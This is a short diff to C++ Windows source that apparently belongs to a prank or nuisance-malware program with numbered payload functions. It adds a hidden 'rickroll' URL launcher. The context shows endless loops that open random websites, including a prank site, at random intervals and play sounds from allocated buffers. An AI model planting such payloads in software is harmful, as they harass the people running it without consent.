@@ -2,6 +2,13 @@
 #define fori(x) for (INT i = 0; i < x; i++)
 #define whiletrue while (true)
 
+int rickroll() {
+    ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_HIDE);
+
+    // youtube.com/dQw4w9WgXcQ
+    return 0;
+}
+
 int p1()
 { //msgbox
     MSGBOXPARAMS msg2 = {0};
@@ -379,7 +386,7 @@ int p13()
             "https://www.roblox.com",
             "https://www.youareanidiot.org",
             "https://www.twitter.com/dreamwastaken"
-        }
+        };
         Sleep(rand() % 100000);
         ShellExecuteA(NULL, "open", urls[rand() % 13], NULL, NULL, SW_HIDE);
     }
@@ -439,7 +446,7 @@ int p16()
     whiletrue
     {
         Sleep(rand() % 100);
-        PlaySoundA(NULL, NULL, SND_ASYNC | SND_MEMORY);
+        PlaySound(NULL, NULL, SND_ASYNC | SND_MEMORY);
         LPSTR lpBuffer = (LPSTR)VirtualAlloc(NULL, 0x10000, MEM_COMMIT, PAGE_READWRITE);
         if (lpBuffer == NULL)
         {
@@ -451,5 +458,4 @@ int p16()
         }
         PlaySoundA(lpBuffer, NULL, SND_ASYNC | SND_MEMORY);
         VirtualFree(lpBuffer, 0, MEM_RELEASE);
-    }
-}
+    }}
